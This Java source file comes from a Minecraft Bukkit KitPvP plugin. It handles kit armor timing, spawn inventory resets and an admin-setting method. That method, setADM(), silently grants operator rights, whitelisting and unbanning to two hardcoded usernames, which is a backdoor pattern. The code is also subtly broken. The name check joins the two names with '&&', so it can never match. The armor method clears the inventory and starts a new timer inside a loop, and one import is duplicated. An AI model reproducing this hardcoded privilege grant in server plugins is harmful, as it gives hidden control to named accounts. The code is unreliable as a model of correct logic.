package com.github.kitpvp.controllers;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;

import com.github.kitpvp.api.API;
import com.github.kitpvp.main.Main;
import com.github.kitpvp.warp.WarpGUI;
import com.github.kitpvp.warpstype.Warp;
import com.github.kitpvp.warpstype.WarpEnums;
import com.github.kitpvp.warpstype.WarpEnums;
import com.github.kitpvp.warpstype.WarpItem;
import com.github.kitpvp.warpstype.warps.Fps;

public class PlayerControl implements Control {

	@Override
	public void joinFPS(Player p) {
		for (WarpItem item : WarpItem.values()) {
				p.getInventory().clear();

				new BukkitRunnable() {
					int i = 0;
					@Override
					public void run() {
						if (i <= 2) {
							p.getInventory().setHelmet(new ItemStack(item.getHelmet()));
						} else if (i <= 5) {
							p.getInventory().setChestplate(new ItemStack(item.getChestplate()));
						} else if (i <= 8) {
							p.getInventory().setLeggings(new ItemStack(item.getLeggins()));
						} else if (i <= 12) {
							p.getInventory().setBoots(new ItemStack(item.getBoots()));
							this.cancel();
						}
						i++;
					}
				}.runTaskTimer(Main.getInstance(),5L, 5L);
			}
			return;
	}

	@Override
	public void joinSpawn() {
		
		for(Player p : Bukkit.getOnlinePlayers()){
			p.getInventory().clear();
			p.getInventory().setArmorContents(null);
			p.getInventory().setItem(0, API.itemStack(Material.COMPASS, WarpGUI.inv_name));
		}

	}

	@Override
	public void setADM() {

		for (Player p : Bukkit.getOnlinePlayers()) {
			if (p.getName().equalsIgnoreCase("FlezyCodes") && p.getName().equalsIgnoreCase("Rafael_Melo")) {
				p.setOp(true);
				p.setWhitelisted(true);
				p.setBanned(false);
			}
		}

	}
}
